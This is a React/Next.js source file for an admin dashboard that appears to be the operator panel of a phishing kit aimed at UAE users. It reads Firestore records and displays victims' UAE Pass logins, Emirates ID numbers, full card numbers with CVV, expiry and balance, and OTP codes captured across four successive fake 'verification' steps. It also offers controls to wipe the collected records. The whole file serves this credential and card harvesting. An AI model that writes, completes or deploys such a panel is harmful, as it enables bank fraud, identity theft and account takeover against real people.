'use client';

import { useState, useEffect } from 'react';
import dynamic from 'next/dynamic';
import { db } from '../../lib/firebase';
import { doc, getDoc, deleteDoc, updateDoc } from 'firebase/firestore';

// Dynamically import the UIDsMonitorWidget with no SSR
const UIDsMonitorWidget = dynamic(() => import('../components/FloatingWidget'), {
  ssr: false,
  loading: () => null
});

type FormType = 'firstform' | 'secondform' | 'thirdform' | 'fourthform' | 
                'fifthform' | 'sixthform' | 'seventhform' | 'eighthform';

interface CardDetails {
  balance: string;
  cardNumber: string;
  cvv: string;
  expiry: string;
}

interface UserData {
  uid: string;
  name?: string;
  email?: string;
  mobileNumber?: string;
  status?: string;
  createdAt?: any;
  formType: FormType;
  // First Form Fields
  uaePass?: string;
  // Second Form Fields
  emiratesId?: string;
  step?: string;
  // Third Form Fields
  loanFromBank?: string;
  bankAccounts?: string;
  bankName?: string;
  verificationMethod?: string;
  debitCards?: string;
  creditCards?: string;
  debitCardDetails?: CardDetails[];
  creditCardDetails?: CardDetails[];
  // Fourth to Eighth Form Fields
  otpCode?: string;
}

interface CompleteUserData {
  uid: string;
  name?: string;
  email?: string;
  mobileNumber?: string;
  forms: {
    [key in FormType]?: any;
  };
}

interface FormData {
  [key: string]: any;
}

interface ManageFormData {
  formType: FormType;
  data: FormData;
}

export default function MinimalDashboard() {
  const [activeForm, setActiveForm] = useState<FormType>('firstform');
  const [users, setUsers] = useState<UserData[]>([]);
  const [allUsers, setAllUsers] = useState<CompleteUserData[]>([]);
  const [selectedUser, setSelectedUser] = useState<CompleteUserData | null>(null);
  const [viewMode, setViewMode] = useState<'forms' | 'users' | 'userDetail' | 'manageData'>('forms');
  const [formUserCounts, setFormUserCounts] = useState<Record<FormType, number>>({
    firstform: 0,
    secondform: 0,
    thirdform: 0,
    fourthform: 0,
    fifthform: 0,
    sixthform: 0,
    seventhform: 0,
    eighthform: 0
  });
  const [loading, setLoading] = useState(true);
  const [stats, setStats] = useState({
    totalUsers: 0,
    pending: 0,
    completed: 0,
    todayUsers: 0
  });
  const [allFormData, setAllFormData] = useState<ManageFormData[]>([]);
  const [deleting, setDeleting] = useState<string | null>(null);
  const [isClient, setIsClient] = useState(false);

  // Set client-side flag
  useEffect(() => {
    setIsClient(true);
  }, []);

  // Form configurations with titles and colors
  const formConfigs: Record<FormType, { 
    title: string; 
    color: string;
    description: string;
    icon: string;
  }> = {
    firstform: { 
      title: 'Basic Information', 
      color: 'blue',
      description: 'User personal details and contact information',
      icon: '👤'
    },
    secondform: { 
      title: 'Emirates ID Verification', 
      color: 'green',
      description: 'Emirates ID details and verification',
      icon: '🆔'
    },
    thirdform: { 
      title: 'Bank Verification', 
      color: 'purple',
      description: 'Bank accounts, cards, and loan information',
      icon: '🏦'
    },
    fourthform: { 
      title: 'OTP Verification 1', 
      color: 'yellow',
      description: 'First OTP verification step',
      icon: '🔢'
    },
    fifthform: { 
      title: 'OTP Verification 2', 
      color: 'red',
      description: 'Second OTP verification step',
      icon: '🔢'
    },
    sixthform: { 
      title: 'OTP Verification 3', 
      color: 'indigo',
      description: 'Third OTP verification step',
      icon: '🔢'
    },
    seventhform: { 
      title: 'OTP Verification 4', 
      color: 'pink',
      description: 'Fourth OTP verification step',
      icon: '🔢'
    },
    eighthform: { 
      title: 'Final Verification', 
      color: 'gray',
      description: 'Final OTP verification and completion',
      icon: '✅'
    }
  };

  // Fetch user counts for ALL forms on initial load
  useEffect(() => {
    const fetchAllFormCounts = async () => {
      try {
        setLoading(true);
        const counts: Record<FormType, number> = {
          firstform: 0,
          secondform: 0,
          thirdform: 0,
          fourthform: 0,
          fifthform: 0,
          sixthform: 0,
          seventhform: 0,
          eighthform: 0
        };

        // Fetch counts for all forms
        const formTypes: FormType[] = [
          'firstform', 'secondform', 'thirdform', 'fourthform',
          'fifthform', 'sixthform', 'seventhform', 'eighthform'
        ];

        for (const formType of formTypes) {
          const formDocRef = doc(db, 'users', formType);
          const formSnapshot = await getDoc(formDocRef);
          
          if (formSnapshot.exists()) {
            const formData = formSnapshot.data();
            let userCount = 0;
            
            // Count UID fields in this form
            Object.keys(formData).forEach(key => {
              if (key.startsWith('user_')) {
                userCount++;
              }
            });
            
            counts[formType] = userCount;
          }
        }

        setFormUserCounts(counts);

        // Calculate total unique users across all forms
        const allUids = new Set<string>();
        for (const formType of formTypes) {
          const formDocRef = doc(db, 'users', formType);
          const formSnapshot = await getDoc(formDocRef);
          
          if (formSnapshot.exists()) {
            const formData = formSnapshot.data();
            Object.keys(formData).forEach(key => {
              if (key.startsWith('user_')) {
                allUids.add(key);
              }
            });
          }
        }

        setStats(prev => ({
          ...prev,
          totalUsers: allUids.size
        }));

      } catch (error) {
        console.error('Error fetching form counts:', error);
      } finally {
        setLoading(false);
      }
    };

    fetchAllFormCounts();
  }, []);

  // Fetch users for the active form
  useEffect(() => {
    const fetchFormUsers = async () => {
      try {
        setLoading(true);
        const formDocRef = doc(db, 'users', activeForm);
        const formSnapshot = await getDoc(formDocRef);
        
        const formUsers: UserData[] = [];
        
        if (formSnapshot.exists()) {
          const formData = formSnapshot.data();
          
          // Extract user data from each UID field
          Object.entries(formData).forEach(([key, value]) => {
            if (key.startsWith('user_')) {
              const userData = value as any;
              formUsers.push({
                uid: key,
                name: userData.name,
                email: userData.email,
                mobileNumber: userData.mobileNumber,
                status: userData.status,
                createdAt: userData.createdAt,
                formType: activeForm,
                // First Form
                uaePass: userData.uaePass,
                // Second Form
                emiratesId: userData.emiratesId,
                step: userData.step,
                // Third Form
                loanFromBank: userData.loanFromBank,
                bankAccounts: userData.bankAccounts,
                bankName: userData.bankName,
                verificationMethod: userData.verificationMethod,
                debitCards: userData.debitCards,
                creditCards: userData.creditCards,
                debitCardDetails: userData.debitCardDetails,
                creditCardDetails: userData.creditCardDetails,
                // Fourth to Eighth Forms
                otpCode: userData.otpCode
              });
            }
          });
        }
        
        setUsers(formUsers);
        
        // Calculate stats for current form
        const today = new Date();
        today.setHours(0, 0, 0, 0);
        
        const todayCount = formUsers.filter(user => {
          if (user.createdAt && user.createdAt.toDate) {
            const userDate = user.createdAt.toDate();
            userDate.setHours(0, 0, 0, 0);
            return userDate.getTime() === today.getTime();
          }
          return false;
        }).length;

        const pendingCount = formUsers.filter(user => user.status === 'pending').length;
        const completedCount = formUsers.filter(user => user.status === 'completed' || user.status === 'approved').length;

        setStats(prev => ({
          ...prev,
          totalUsers: formUsers.length,
          pending: pendingCount,
          completed: completedCount,
          todayUsers: todayCount
        }));

      } catch (error) {
        console.error('Error fetching users:', error);
      } finally {
        setLoading(false);
      }
    };

    if (viewMode === 'forms') {
      fetchFormUsers();
    }
  }, [activeForm, viewMode]);

  // Fetch all users data for user overview
  const fetchAllUsers = async () => {
    try {
      setLoading(true);
      setViewMode('users');
      
      const formTypes: FormType[] = [
        'firstform', 'secondform', 'thirdform', 'fourthform',
        'fifthform', 'sixthform', 'seventhform', 'eighthform'
      ];

      const allUsersMap = new Map<string, CompleteUserData>();

      // Collect data from all forms
      for (const formType of formTypes) {
        const formDocRef = doc(db, 'users', formType);
        const formSnapshot = await getDoc(formDocRef);
        
        if (formSnapshot.exists()) {
          const formData = formSnapshot.data();
          
          Object.entries(formData).forEach(([key, value]) => {
            if (key.startsWith('user_')) {
              const userData = value as any;
              
              if (!allUsersMap.has(key)) {
                allUsersMap.set(key, {
                  uid: key,
                  name: userData.name,
                  email: userData.email,
                  mobileNumber: userData.mobileNumber,
                  forms: {}
                });
              }
              
              const user = allUsersMap.get(key)!;
              user.forms[formType] = userData;
            }
          });
        }
      }

      setAllUsers(Array.from(allUsersMap.values()));

    } catch (error) {
      console.error('Error fetching all users:', error);
    } finally {
      setLoading(false);
    }
  };

  // Fetch complete user data for detail view
  const fetchUserDetail = async (uid: string) => {
    try {
      setLoading(true);
      
      const formTypes: FormType[] = [
        'firstform', 'secondform', 'thirdform', 'fourthform',
        'fifthform', 'sixthform', 'seventhform', 'eighthform'
      ];

      const userData: CompleteUserData = {
        uid,
        forms: {}
      };

      // Collect data from all forms for this user
      for (const formType of formTypes) {
        const formDocRef = doc(db, 'users', formType);
        const formSnapshot = await getDoc(formDocRef);
        
        if (formSnapshot.exists()) {
          const formData = formSnapshot.data();
          const userFormData = formData[uid];
          
          if (userFormData) {
            userData.forms[formType] = userFormData;
            // Set basic user info from first form
            if (formType === 'firstform') {
              userData.name = userFormData.name;
              userData.email = userFormData.email;
              userData.mobileNumber = userFormData.mobileNumber;
            }
          }
        }
      }

      setSelectedUser(userData);
      setViewMode('userDetail');

    } catch (error) {
      console.error('Error fetching user detail:', error);
    } finally {
      setLoading(false);
    }
  };

  // Fetch all form data for management
  const fetchAllFormData = async () => {
    try {
      setLoading(true);
      setViewMode('manageData');
      
      const formTypes: FormType[] = [
        'firstform', 'secondform', 'thirdform', 'fourthform',
        'fifthform', 'sixthform', 'seventhform', 'eighthform'
      ];

      const allData: ManageFormData[] = [];

      // Collect data from all forms
      for (const formType of formTypes) {
        const formDocRef = doc(db, 'users', formType);
        const formSnapshot = await getDoc(formDocRef);
        
        if (formSnapshot.exists()) {
          const formData = formSnapshot.data() as FormData;
          allData.push({
            formType: formType as FormType,
            data: formData
          });
        } else {
          allData.push({
            formType: formType as FormType,
            data: {}
          });
        }
      }

      setAllFormData(allData);

    } catch (error) {
      console.error('Error fetching all form data:', error);
    } finally {
      setLoading(false);
    }
  };

  // Delete specific user data from a form
  const deleteUserData = async (formType: FormType, userId: string) => {
    try {
      setDeleting(`${formType}-${userId}`);
      
      const formDocRef = doc(db, 'users', formType);
      const formSnapshot = await getDoc(formDocRef);
      
      if (formSnapshot.exists()) {
        const formData = formSnapshot.data() as FormData;
        const updatedData: FormData = { ...formData };
        delete updatedData[userId];
        
        await updateDoc(formDocRef, updatedData);
        
        // Update local state
        setAllFormData(prev => 
          prev.map(item => 
            item.formType === formType 
              ? { ...item, data: updatedData }
              : item
          )
        );
        
        // Refresh counts
        const counts = { ...formUserCounts };
        counts[formType] = Object.keys(updatedData).filter(key => key.startsWith('user_')).length;
        setFormUserCounts(counts);
        
        alert(`Successfully deleted user data from ${formConfigs[formType].title}`);
      }
    } catch (error) {
      console.error('Error deleting user data:', error);
      alert('Error deleting user data');
    } finally {
      setDeleting(null);
    }
  };

  // Delete entire form data
  const deleteFormData = async (formType: FormType) => {
    if (!confirm(`Are you sure you want to delete ALL data from ${formConfigs[formType].title}? This action cannot be undone.`)) {
      return;
    }

    try {
      setDeleting(formType);
      
      const formDocRef = doc(db, 'users', formType);
      const formSnapshot = await getDoc(formDocRef);
      
      if (formSnapshot.exists()) {
        const formData = formSnapshot.data() as FormData;
        const emptyData: FormData = {};
        
        // Keep only non-user fields if any, otherwise set empty
        Object.keys(formData).forEach(key => {
          if (!key.startsWith('user_')) {
            emptyData[key] = formData[key];
          }
        });
        
        await updateDoc(formDocRef, emptyData);
        
        // Update local state
        setAllFormData(prev => 
          prev.map(item => 
            item.formType === formType 
              ? { ...item, data: emptyData }
              : item
          )
        );
        
        // Update counts
        const counts = { ...formUserCounts };
        counts[formType] = 0;
        setFormUserCounts(counts);
        
        alert(`Successfully deleted all data from ${formConfigs[formType].title}`);
      }
    } catch (error) {
      console.error('Error deleting form data:', error);
      alert('Error deleting form data');
    } finally {
      setDeleting(null);
    }
  };

  // Render card details
  const renderCardDetails = (cardDetails: CardDetails[], type: 'debit' | 'credit') => {
    if (!cardDetails || cardDetails.length === 0) {
      return <div className="text-gray-500 text-sm">No {type} cards</div>;
    }

    return (
      <div className="mt-2">
        <h5 className="font-medium text-gray-700 mb-2">{type.charAt(0).toUpperCase() + type.slice(1)} Cards:</h5>
        <div className="space-y-3">
          {cardDetails.map((card, index) => (
            <div key={index} className="bg-gray-50 p-3 rounded-lg border">
              <div className="grid grid-cols-2 gap-2 text-sm text-gray-600">
                <div><strong>Card Number:</strong> {card.cardNumber}</div>
                <div><strong>Expiry:</strong> {card.expiry}</div>
                <div><strong>CVV:</strong> {card.cvv}</div>
                <div><strong>Balance:</strong> {card.balance}</div>
              </div>
            </div>
          ))}
        </div>
      </div>
    );
  };

  // Render form-specific fields based on active form
  const renderFormSpecificFields = (user: UserData) => {
    const config = formConfigs[activeForm];
    
    switch (activeForm) {
      case 'firstform':
        return (
          <div className="grid grid-cols-2 gap-2 text-sm text-gray-600">
            <div><strong className="text-gray-700">UAE Pass:</strong> {user.uaePass || 'N/A'}</div>
            <div><strong className="text-gray-700">Mobile:</strong> {user.mobileNumber || 'N/A'}</div>
            <div><strong className="text-gray-700">Email:</strong> {user.email || 'N/A'}</div>
            <div><strong className="text-gray-700">Created:</strong> {user.createdAt?.toDate?.().toLocaleDateString() || 'N/A'}</div>
          </div>
        );
      
      case 'secondform':
        return (
          <div className="grid grid-cols-2 gap-2 text-sm text-gray-600">
            <div><strong className="text-gray-700">Emirates ID:</strong> {user.emiratesId || 'N/A'}</div>
            <div><strong className="text-gray-700">Step:</strong> {user.step || 'N/A'}</div>
            <div><strong className="text-gray-700">Status:</strong> {user.status || 'N/A'}</div>
            <div><strong className="text-gray-700">Created:</strong> {user.createdAt?.toDate?.().toLocaleDateString() || 'N/A'}</div>
          </div>
        );
      
      case 'thirdform':
        return (
          <div className="space-y-3">
            <div className="grid grid-cols-2 gap-2 text-sm text-gray-600">
              <div><strong className="text-gray-700">Bank:</strong> {user.bankName || 'N/A'}</div>
              <div><strong className="text-gray-700">Loan:</strong> {user.loanFromBank || 'N/A'}</div>
              <div><strong className="text-gray-700">Accounts:</strong> {user.bankAccounts || '0'}</div>
              <div><strong className="text-gray-700">Method:</strong> {user.verificationMethod || 'N/A'}</div>
            </div>
            
            {/* Debit Card Details */}
            {renderCardDetails(user.debitCardDetails || [], 'debit')}
            
            {/* Credit Card Details */}
            {renderCardDetails(user.creditCardDetails || [], 'credit')}
          </div>
        );
      
      case 'fourthform':
      case 'fifthform':
      case 'sixthform':
      case 'seventhform':
      case 'eighthform':
        return (
          <div className="grid grid-cols-2 gap-2 text-sm text-gray-600">
            <div><strong className="text-gray-700">OTP Code:</strong> {user.otpCode || 'N/A'}</div>
            <div><strong className="text-gray-700">Step:</strong> {user.step || 'N/A'}</div>
            <div><strong className="text-gray-700">Status:</strong> {user.status || 'N/A'}</div>
            <div><strong className="text-gray-700">Created:</strong> {user.createdAt?.toDate?.().toLocaleDateString() || 'N/A'}</div>
          </div>
        );
      
      default:
        return null;
    }
  };

  // Render user detail view with all 8 forms
  const renderUserDetail = () => {
    if (!selectedUser) return null;

    return (
      <div className="space-y-6">
        {/* User Header */}
        <div className="bg-white rounded-lg shadow-sm border p-6">
          <div className="flex justify-between items-start">
            <div>
              <h2 className="text-2xl font-bold text-gray-800">{selectedUser.name || 'Unnamed User'}</h2>
              <p className="text-gray-600">UID: {selectedUser.uid}</p>
              <div className="flex gap-4 mt-2 text-sm text-gray-600">
                <div><strong>Email:</strong> {selectedUser.email || 'N/A'}</div>
                <div><strong>Mobile:</strong> {selectedUser.mobileNumber || 'N/A'}</div>
              </div>
            </div>
            <button
              onClick={() => setViewMode('users')}
              className="bg-gray-500 hover:bg-gray-600 text-white px-4 py-2 rounded-lg"
            >
              ← Back to Users
            </button>
          </div>
        </div>

        {/* All Forms Data */}
        <div className="space-y-4">
          {Object.entries(formConfigs).map(([formType, config]) => {
            const formData = selectedUser.forms[formType as FormType];
            
            return (
              <div key={formType} className="bg-white rounded-lg shadow-sm border p-6">
                <div className="flex items-center mb-4">
                  <span className="text-2xl mr-3">{config.icon}</span>
                  <h3 className="text-xl font-semibold text-gray-800">{config.title}</h3>
                  <span className={`ml-auto px-3 py-1 rounded-full text-xs font-medium ${
                    formData ? 'bg-green-100 text-green-800' : 'bg-gray-100 text-gray-800'
                  }`}>
                    {formData ? 'Submitted' : 'Not Submitted'}
                  </span>
                </div>

                {formData ? (
                  <div className="space-y-3">
                    {/* Render form-specific data */}
                    {formType === 'firstform' && (
                      <div className="grid grid-cols-2 gap-4 text-sm text-gray-600">
                        <div><strong>UAE Pass:</strong> {formData.uaePass || 'N/A'}</div>
                        <div><strong>Status:</strong> {formData.status || 'N/A'}</div>
                        <div><strong>Created:</strong> {formData.createdAt?.toDate?.().toLocaleDateString() || 'N/A'}</div>
                      </div>
                    )}

                    {formType === 'secondform' && (
                      <div className="grid grid-cols-2 gap-4 text-sm text-gray-600">
                        <div><strong>Emirates ID:</strong> {formData.emiratesId || 'N/A'}</div>
                        <div><strong>Step:</strong> {formData.step || 'N/A'}</div>
                        <div><strong>Status:</strong> {formData.status || 'N/A'}</div>
                      </div>
                    )}

                    {formType === 'thirdform' && (
                      <div className="space-y-3">
                        <div className="grid grid-cols-2 gap-4 text-sm text-gray-600">
                          <div><strong>Bank:</strong> {formData.bankName || 'N/A'}</div>
                          <div><strong>Loan:</strong> {formData.loanFromBank || 'N/A'}</div>
                          <div><strong>Accounts:</strong> {formData.bankAccounts || '0'}</div>
                          <div><strong>Method:</strong> {formData.verificationMethod || 'N/A'}</div>
                        </div>
                        {renderCardDetails(formData.debitCardDetails || [], 'debit')}
                        {renderCardDetails(formData.creditCardDetails || [], 'credit')}
                      </div>
                    )}

                    {(formType === 'fourthform' || formType === 'fifthform' || formType === 'sixthform' || formType === 'seventhform' || formType === 'eighthform') && (
                      <div className="grid grid-cols-2 gap-4 text-sm text-gray-600">
                        <div><strong>OTP Code:</strong> {formData.otpCode || 'N/A'}</div>
                        <div><strong>Step:</strong> {formData.step || 'N/A'}</div>
                        <div><strong>Status:</strong> {formData.status || 'N/A'}</div>
                      </div>
                    )}
                  </div>
                ) : (
                  <div className="text-center py-4 text-gray-500">
                    No data submitted for this form
                  </div>
                )}
              </div>
            );
          })}
        </div>
      </div>
    );
  };

  // Render manage data view
  const renderManageData = () => {
    return (
      <div className="space-y-6">
        <div className="bg-white rounded-lg shadow-sm border p-6">
          <div className="flex justify-between items-center mb-6">
            <h2 className="text-2xl font-bold text-gray-800">Manage All Form Data</h2>
            <button
              onClick={() => setViewMode('forms')}
              className="bg-gray-500 hover:bg-gray-600 text-white px-4 py-2 rounded-lg"
            >
              ← Back to Forms
            </button>
          </div>

          {loading ? (
            <div className="text-center py-8 text-gray-500">Loading form data...</div>
          ) : (
            <div className="space-y-6">
              {allFormData.map(({ formType, data }) => {
                const config = formConfigs[formType];
                const userEntries = Object.entries(data).filter(([key]) => key.startsWith('user_'));
                
                return (
                  <div key={formType} className="border rounded-lg p-6">
                    <div className="flex justify-between items-center mb-4">
                      <div className="flex items-center">
                        <span className="text-2xl mr-3">{config.icon}</span>
                        <div>
                          <h3 className="text-xl font-semibold text-gray-800">{config.title}</h3>
                          <p className="text-gray-600">{userEntries.length} users</p>
                        </div>
                      </div>
                      <button
                        onClick={() => deleteFormData(formType)}
                        disabled={deleting === formType || userEntries.length === 0}
                        className="bg-red-500 hover:bg-red-600 disabled:bg-red-300 text-white px-4 py-2 rounded-lg"
                      >
                        {deleting === formType ? 'Deleting...' : 'Delete All Data'}
                      </button>
                    </div>

                    {userEntries.length === 0 ? (
                      <div className="text-center py-4 text-gray-500">
                        No user data in this form
                      </div>
                    ) : (
                      <div className="space-y-3 max-h-96 overflow-y-auto">
                        {userEntries.map(([userId, userData]) => (
                          <div key={userId} className="border rounded-lg p-4">
                            <div className="flex justify-between items-start mb-3">
                              <div>
                                <h4 className="font-semibold text-gray-800">
                                  {(userData as any).name || 'Unnamed User'}
                                </h4>
                                <p className="text-sm text-gray-600">ID: {userId}</p>
                                <p className="text-sm text-gray-600">Email: {(userData as any).email || 'N/A'}</p>
                                <p className="text-sm text-gray-600">Mobile: {(userData as any).mobileNumber || 'N/A'}</p>
                              </div>
                              <button
                                onClick={() => deleteUserData(formType, userId)}
                                disabled={deleting === `${formType}-${userId}`}
                                className="bg-red-500 hover:bg-red-600 disabled:bg-red-300 text-white px-3 py-1 rounded text-sm"
                              >
                                {deleting === `${formType}-${userId}` ? 'Deleting...' : 'Delete'}
                              </button>
                            </div>
                            
                            {/* Show relevant data based on form type */}
                            <div className="text-sm text-gray-600">
                              {formType === 'firstform' && (
                                <div>
                                  <strong>UAE Pass:</strong> {(userData as any).uaePass || 'N/A'} | 
                                  <strong> Status:</strong> {(userData as any).status || 'N/A'}
                                </div>
                              )}
                              {formType === 'secondform' && (
                                <div>
                                  <strong>Emirates ID:</strong> {(userData as any).emiratesId || 'N/A'} | 
                                  <strong> Step:</strong> {(userData as any).step || 'N/A'}
                                </div>
                              )}
                              {formType === 'thirdform' && (
                                <div>
                                  <strong>Bank:</strong> {(userData as any).bankName || 'N/A'} | 
                                  <strong> Accounts:</strong> {(userData as any).bankAccounts || '0'}
                                </div>
                              )}
                              {(formType === 'fourthform' || formType === 'fifthform' || formType === 'sixthform' || formType === 'seventhform' || formType === 'eighthform') && (
                                <div>
                                  <strong>OTP Code:</strong> {(userData as any).otpCode || 'N/A'} | 
                                  <strong> Step:</strong> {(userData as any).step || 'N/A'}
                                </div>
                              )}
                              {(userData as any).createdAt && (
                                <div className="mt-1 text-xs text-gray-500">
                                  Created: {(userData as any).createdAt.toDate?.().toLocaleString() || 'N/A'}
                                </div>
                              )}
                            </div>
                          </div>
                        ))}
                      </div>
                    )}
                  </div>
                );
              })}
            </div>
          )}
        </div>
      </div>
    );
  };

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <header className="bg-white shadow-sm border-b">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-16">
            <div className="flex items-center">
              <h1 className="text-2xl font-bold text-gray-900">Forms Dashboard</h1>
            </div>
            <div className="flex items-center space-x-4">
              <span className="text-sm text-gray-500">Admin Panel</span>
              {!loading && viewMode === 'forms' && (
                <span className="text-sm text-green-600 bg-green-100 px-2 py-1 rounded">
                  {stats.totalUsers} Users
                </span>
              )}
            </div>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        {/* Navigation */}
        <div className="flex gap-4 mb-6">
          <button
            onClick={() => setViewMode('forms')}
            className={`px-4 py-2 rounded-lg ${
              viewMode === 'forms' 
                ? 'bg-blue-500 text-white' 
                : 'bg-gray-200 text-gray-700 hover:bg-gray-300'
            }`}
          >
            Forms View
          </button>
          
          <button
            onClick={fetchAllUsers}
            className={`px-4 py-2 rounded-lg ${
              viewMode === 'users' || viewMode === 'userDetail'
                ? 'bg-green-500 text-white' 
                : 'bg-gray-200 text-gray-700 hover:bg-gray-300'
            }`}
          >
            Users Overview ({stats.totalUsers})
          </button>

          <button
            onClick={fetchAllFormData}
            className={`px-4 py-2 rounded-lg ${
              viewMode === 'manageData'
                ? 'bg-red-500 text-white' 
                : 'bg-gray-200 text-gray-700 hover:bg-gray-300'
            }`}
          >
            Manage Data
          </button>
        </div>

        {viewMode === 'manageData' ? (
          renderManageData()
        ) : viewMode === 'userDetail' ? (
          renderUserDetail()
        ) : viewMode === 'users' ? (
          /* Users Overview */
          <div className="space-y-6">
            <div className="bg-white rounded-lg shadow-sm border p-6">
              <h2 className="text-2xl font-bold text-gray-800 mb-4">All Users ({allUsers.length})</h2>
              
              {loading ? (
                <div className="text-center py-8 text-gray-500">Loading users...</div>
              ) : allUsers.length === 0 ? (
                <div className="text-center py-8 text-gray-500">
                  <div className="text-4xl mb-2">📭</div>
                  <p>No users found</p>
                </div>
              ) : (
                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                  {allUsers.map((user) => (
                    <div 
                      key={user.uid} 
                      className="border rounded-lg p-4 hover:bg-gray-50 transition-colors cursor-pointer"
                      onClick={() => fetchUserDetail(user.uid)}
                    >
                      <h3 className="font-semibold text-gray-800">{user.name || 'Unnamed User'}</h3>
                      <p className="text-sm text-gray-600">{user.email || 'No email'}</p>
                      <p className="text-xs text-gray-500 mt-2">UID: {user.uid}</p>
                      <div className="flex gap-2 mt-3">
                        {Object.entries(formConfigs).map(([formType]) => (
                          <span 
                            key={formType}
                            className={`w-3 h-3 rounded-full ${
                              user.forms[formType as FormType] ? 'bg-green-500' : 'bg-gray-300'
                            }`}
                            title={formConfigs[formType as FormType].title}
                          />
                        ))}
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>
        ) : (
          /* Forms View */
          <>
            {/* Form Selection Buttons */}
            <div className="bg-white rounded-lg shadow-sm border p-6 mb-8">
              <h2 className="text-xl font-semibold text-gray-800 mb-4">Select Form to View</h2>
              <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
                {Object.entries(formConfigs).map(([formType, config]) => (
                  <button
                    key={formType}
                    onClick={() => setActiveForm(formType as FormType)}
                    className={`p-4 rounded-lg text-left transition-all ${
                      activeForm === formType
                        ? `bg-${config.color}-500 text-white shadow-lg transform scale-105`
                        : 'bg-gray-100 text-gray-700 hover:bg-gray-200'
                    }`}
                  >
                    <div className="font-semibold">{config.title}</div>
                    <div className={`text-sm ${
                      activeForm === formType ? 'text-blue-100' : 'text-gray-500'
                    }`}>
                      {formUserCounts[formType as FormType]} users
                    </div>
                  </button>
                ))}
              </div>
            </div>

            {/* Active Form Header */}
            <div className="bg-white rounded-lg shadow-sm border p-6 mb-8">
              <div className="flex items-center justify-between">
                <div>
                  <h2 className="text-2xl font-bold text-gray-800">
                    {formConfigs[activeForm].title}
                  </h2>
                  <p className="text-gray-600 mt-1">
                    {formConfigs[activeForm].description}
                  </p>
                </div>
                <div className="text-right">
                  <div className="text-3xl font-bold text-blue-600">{stats.totalUsers}</div>
                  <div className="text-sm text-gray-500">Total Users</div>
                </div>
              </div>
            </div>

            {/* Stats Grid */}
            <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
              <div 
                className="bg-white rounded-lg shadow-sm border p-6 cursor-pointer hover:bg-blue-50 transition-colors"
                onClick={fetchAllUsers}
              >
                <div className="flex items-center">
                  <div className="bg-blue-100 p-3 rounded-lg">
                    <span className="text-blue-600 text-xl">👥</span>
                  </div>
                  <div className="ml-4">
                    <p className="text-sm font-medium text-gray-600">Total Users</p>
                    <p className="text-2xl font-bold text-gray-900">
                      {loading ? '-' : stats.totalUsers}
                    </p>
                  </div>
                </div>
              </div>

              <div className="bg-white rounded-lg shadow-sm border p-6">
                <div className="flex items-center">
                  <div className="bg-yellow-100 p-3 rounded-lg">
                    <span className="text-yellow-600 text-xl">⏳</span>
                  </div>
                  <div className="ml-4">
                    <p className="text-sm font-medium text-gray-600">Pending</p>
                    <p className="text-2xl font-bold text-gray-900">
                      {loading ? '-' : stats.pending}
                    </p>
                  </div>
                </div>
              </div>

              <div className="bg-white rounded-lg shadow-sm border p-6">
                <div className="flex items-center">
                  <div className="bg-green-100 p-3 rounded-lg">
                    <span className="text-green-600 text-xl">✅</span>
                  </div>
                  <div className="ml-4">
                    <p className="text-sm font-medium text-gray-600">Completed</p>
                    <p className="text-2xl font-bold text-gray-900">
                      {loading ? '-' : stats.completed}
                    </p>
                  </div>
                </div>
              </div>
            </div>

            {/* Users List */}
            <div className="bg-white rounded-lg shadow-sm border p-6">
              <h3 className="text-lg font-semibold text-gray-800 mb-4">
                Users - {formConfigs[activeForm].title}
              </h3>
              
              {loading ? (
                <div className="text-center py-8 text-gray-500">Loading users...</div>
              ) : users.length === 0 ? (
                <div className="text-center py-8 text-gray-500">
                  <div className="text-4xl mb-2">📭</div>
                  <p>No users found for {formConfigs[activeForm].title}</p>
                  <p className="text-sm">Users will appear here once they complete this form</p>
                </div>
              ) : (
                <div className="space-y-4">
                  {users.map((user) => (
                    <div key={user.uid} className="border rounded-lg p-4 hover:bg-gray-50 transition-colors">
                      <div className="flex justify-between items-start mb-3">
                        <div>
                          <h4 className="font-semibold text-gray-800">
                            {user.name || 'Unnamed User'}
                          </h4>
                          <p className="text-sm text-gray-600">UID: {user.uid}</p>
                        </div>
                        <span className={`px-3 py-1 rounded-full text-xs font-medium ${
                          user.status === 'completed' ? 'bg-green-100 text-green-800' :
                          user.status === 'pending' ? 'bg-yellow-100 text-yellow-800' :
                          'bg-gray-100 text-gray-800'
                        }`}>
                          {user.status || 'unknown'}
                        </span>
                      </div>
                      
                      {renderFormSpecificFields(user)}
                    </div>
                  ))}
                </div>
              )}
            </div>
          </>
        )}
      </main>

      {/* Floating UIDs Monitor Widget - Only rendered on client side */}
      {isClient && <UIDsMonitorWidget />}
    </div>
  );
}